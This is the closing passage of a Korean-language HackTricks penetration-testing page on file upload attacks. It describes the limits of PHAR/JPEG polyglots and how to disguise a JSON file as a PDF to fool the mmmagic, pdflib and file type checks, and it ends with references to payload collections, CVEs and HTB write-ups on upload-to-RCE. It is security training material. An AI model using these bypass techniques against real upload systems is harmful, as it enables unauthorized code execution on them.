적응력이 높지만 polyglot에도 한계는 있습니다. 예를 들어, polyglot이 PHAR file (PHp ARchive)과 JPEG를 동시에 구현하더라도, 업로드 성공 여부는 플랫폼의 파일 확장자 정책에 달려 있을 수 있습니다. 시스템이 허용 가능한 확장자에 대해 엄격하면, polyglot의 단순한 구조적 이중성만으로는 업로드가 보장되지 않을 수 있습니다.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF인 척 하여 유효한 JSON 업로드하기

허용되지 않은 경우에도 PDF 파일인 척 하여 유효한 JSON 파일을 업로드함으로써 파일 타입 감지를 피하는 방법(기술은 **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** 참조):

- **`mmmagic` library**: 처음 1024바이트 안에 `%PDF` 매직 바이트가 있으면 유효하다고 판단됩니다 (예시는 포스트 참조)
- **`pdflib` library**: JSON의 필드 안에 가짜 PDF 포맷을 추가하면 라이브러리가 이를 PDF로 인식합니다 (예시는 포스트 참조)
- **`file` binary**: 파일에서 최대 1048576 바이트까지 읽을 수 있습니다. 그보다 큰 JSON을 만들어서 내용을 json으로 파싱하지 못하게 한 뒤 JSON 내부에 실제 PDF의 초기 부분을 넣으면 PDF로 인식합니다

## 참고자료

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
